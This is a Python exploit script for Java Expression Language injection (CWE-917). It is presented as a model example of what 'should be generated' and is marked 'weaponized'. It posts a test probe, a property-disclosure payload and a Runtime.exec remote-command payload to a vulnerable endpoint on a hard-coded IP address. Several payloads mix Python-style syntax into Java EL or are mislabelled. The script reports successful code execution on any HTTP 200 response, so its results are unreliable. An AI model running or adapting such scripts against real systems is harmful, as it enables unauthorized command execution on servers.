"""
EXAMPLE: Proper EL Injection Exploit
This demonstrates what SHOULD be generated for EL-related vulnerabilities.
"""

"""
Metadata:
{
  "architecture": "64-bit",
  "protocol": "HTTP",
  "cwe": "CWE-917",
  "type": "EL Injection",
  "weaponized": true
}
"""

import requests

# [SECTION 1] Target Configuration
target = "http://192.168.1.157:8080"

# [SECTION 2] Payload Construction
# EL Injection payload - executes Runtime.getRuntime().exec("whoami")
# Explanation: Java EL allows ${...} syntax to evaluate expressions
# We use reflection to call Runtime.getRuntime().exec()

payloads = [
    # Test payload - should return 49 if EL Injection exists
    "${{7*7}}",
    
    # System property disclosure
    "${{\"\".__class__.forName(\"java.lang.System\").getProperty(\"user.name\")}}",
    
    # Remote Code Execution
    "${{\"\".__class__.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")}}",
    
    # Alternative RCE syntax
    "${{applicationScope}}"
]

# [SECTION 3] Exploit Execution
print("[*] Testing EL Injection vulnerability...")

for i, payload in enumerate(payloads, 1):
    try:
        # Assuming the vulnerable parameter is 'expression'
        response = requests.post(
            f"{target}/vulnerable-endpoint",
            data={"expression": payload},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=5
        )
        
        # [SECTION 4] Response Validation
        print(f"\n[+] Payload {i}: {payload[:50]}")
        print(f"    Status Code: {response.status_code}")
        print(f"    Response Preview: {response.text[:200]}")
        
        # Check for successful exploitation
        if i == 1 and "49" in response.text:
            print("[!] CONFIRMED: EL Injection vulnerability detected!")
            print("[*] Server evaluates EL expressions")
        elif i in [2, 3] and response.status_code == 200:
            print("[!] RCE payload executed successfully!")
            print(f"[*] Command output: {response.text}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error with payload {i}: {e}")

print("\n[*] Exploit demonstration complete.")
